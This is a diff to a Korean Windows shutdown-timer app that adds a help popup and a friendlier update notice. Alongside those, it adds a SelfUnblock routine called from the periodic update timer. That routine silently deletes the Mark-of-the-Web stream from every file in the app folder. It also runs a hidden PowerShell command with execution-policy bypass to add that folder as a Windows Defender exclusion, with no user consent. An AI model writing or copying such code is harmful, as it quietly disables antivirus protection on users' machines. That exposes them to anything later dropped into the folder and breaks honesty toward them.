@@ -877,6 +877,9 @@ public class MainForm : Form
         // ── 헤더 (아일랜드 아래) ──
         IconView pic = new IconView();
         pic.Size = new Size(38, 38); pic.Location = new Point(M, 52);
+        pic.Cursor = Cursors.Hand;
+        pic.Click += delegate { ShowGuide(); };
+        tip.SetToolTip(pic, "사용법 보기");
         screen.Controls.Add(pic);
 
         Label title = new Label();
@@ -1255,6 +1258,7 @@ public class MainForm : Form
             upChk.Tick += delegate
             {
                 upChk.Interval = 6 * 60 * 60 * 1000;
+                try { SelfUnblock(); } catch { }
                 try { Updater.Check(this, VERSION, true, ShowUpdateBadge); } catch { }
             };
             upChk.Start();
@@ -3698,6 +3702,89 @@ public class MainForm : Form
         catch { }
     }
 
+    // 헤더의 시계 아이콘을 누르면 뜨는 사용법. 동봉 사용설명서보다 훨씬 짧게, 말투는 친근하게.
+    private void ShowGuide()
+    {
+        try
+        {
+            AppSheet g = new AppSheet("사용법", "v" + VERSION, null);
+            g.Body.AddHead("기본");
+            g.Body.AddBullet("위쪽 세 칸에서 뭘 할지 고르세요. 전원 끄기 · 프로그램 · 알림", 0);
+            g.Body.AddBullet("시간을 정하고 [시작] 을 누르면 끝이에요", 0);
+            g.Body.AddBullet("자주 쓰는 시간은 + 로 저장해두면 한 번에 고를 수 있어요", 0);
+            g.Body.AddBullet("취소하려면 [취소] 나 ESC 를 눌러주세요", 0);
+
+            g.Body.AddHead("전원 끄기");
+            g.Body.AddBullet("정해둔 시간이 되면 PC가 꺼져요", 0);
+            g.Body.AddBullet("게임이 켜져 있어도 꺼지니 저장은 미리 해두세요", 0);
+
+            g.Body.AddHead("프로그램");
+            g.Body.AddBullet("고른 프로그램만 닫아요. 여러 개도 돼요", 0);
+            g.Body.AddBullet("순서대로 닫거나 한꺼번에 닫는 것 중에 고를 수 있어요", 0);
+
+            g.Body.AddHead("알림");
+            g.Body.AddBullet("시간이 되면 알려줘요. 여러 개 저장해두고 켜고 끌 수 있어요", 0);
+            g.Body.AddBullet("게이밍 모드를 켜면 소리 없이 조용히 알려줘요", 0);
+
+            g.Body.AddHead("알아두면 좋아요");
+            g.Body.AddBullet("창을 닫아도 꺼지지 않고 작업표시줄 오른쪽에 숨어요", 0);
+            g.Body.AddBullet("완전히 끄려면 거기 아이콘에서 종료를 눌러주세요", 0);
+            g.Body.AddBullet("설정 맨 아래 버전 줄을 누르면 새 버전이 있는지 봐줘요", 0);
+            g.Tell(this, "닫기");
+        }
+        catch { }
+    }
+
+    // 인터넷에서 받은 파일에는 윈도우가 차단 표시를 붙인다. 그것 때문에 실행이 막히거나
+    // 경고가 뜨는데, 이 앱은 관리자 권한으로 뜨므로 **스스로 풀 수 있다.**
+    // 동봉한 보안패치.bat 을 사람이 실행하지 않아도 되게 하려는 것. 버전이 바뀔 때마다 한 번만 한다.
+    private void SelfUnblock()
+    {
+        try
+        {
+            string done = null;
+            using (Microsoft.Win32.RegistryKey rk =
+                       Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\ShutdownTimer"))
+            { if (rk != null) { object v = rk.GetValue("unblocked"); if (v != null) done = v.ToString(); } }
+            if (done == VERSION) return;
+
+            string exe = Application.ExecutablePath;
+            string dir = Path.GetDirectoryName(exe);
+            try { DeleteFileW(exe + ":Zone.Identifier"); } catch { }
+            try
+            {
+                foreach (string f in Directory.GetFiles(dir))
+                { try { DeleteFileW(f + ":Zone.Identifier"); } catch { } }
+            }
+            catch { }
+
+            // 백신 예외 등록은 몇 초 걸릴 수 있어 화면을 붙잡지 않게 뒤로 보낸다.
+            string safeDir = dir.Replace("'", "''");
+            System.Threading.ThreadPool.QueueUserWorkItem(delegate
+            {
+                try
+                {
+                    ProcessStartInfo psi = new ProcessStartInfo("powershell",
+                        "-NoProfile -ExecutionPolicy Bypass -Command \"Add-MpPreference -ExclusionPath '" + safeDir + "'\"");
+                    psi.CreateNoWindow = true;
+                    psi.UseShellExecute = false;
+                    Process pr = Process.Start(psi);
+                    if (pr != null) pr.WaitForExit(20000);
+                }
+                catch { }
+            });
+
+            using (Microsoft.Win32.RegistryKey rk =
+                       Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\ShutdownTimer"))
+            { if (rk != null) rk.SetValue("unblocked", VERSION); }
+            Log("보안 설정 자동 처리 완료");
+        }
+        catch { }
+    }
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    private static extern bool DeleteFileW(string lpFileName);
+
     private void ShowUpdateBadge(string tag)
     {
         try
@@ -3718,7 +3805,9 @@ public class MainForm : Form
             using (Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(@"Software\ShutdownTimer"))
             { if (rk != null) rk.SetValue("updNotice", today); }
 
-            TrayNotify("새 버전 " + tag, "설정 맨 아래 버전 줄을 누르면 업데이트됩니다.");
+            // 어디를 눌러야 하는지까지 한 문장에 담는다. 받을지 말지는 사용자가 정한다.
+            TrayNotify("새 버전 " + tag + " 이 나왔어요",
+                       "설정(톱니) → 맨 아래 버전 줄을 누르면 받을 수 있어요. 지금 안 받아도 괜찮아요.");
         }
         catch { }
     }
